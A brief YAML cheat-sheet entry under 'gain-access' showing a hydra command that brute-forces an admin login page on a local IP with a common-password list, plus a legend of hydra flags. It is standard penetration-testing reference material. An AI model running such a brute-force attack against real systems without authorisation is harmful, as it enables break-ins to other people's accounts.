---
functions:
  gain-access:
    - description: hydra
      code: |
        hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /logon.php
        
        -l --> username
        -L --> username list
        -p --> password
        -P --> password list
        -t --> threads
        -s --> port
        http-get --> method
        /logon.php --> login path
---
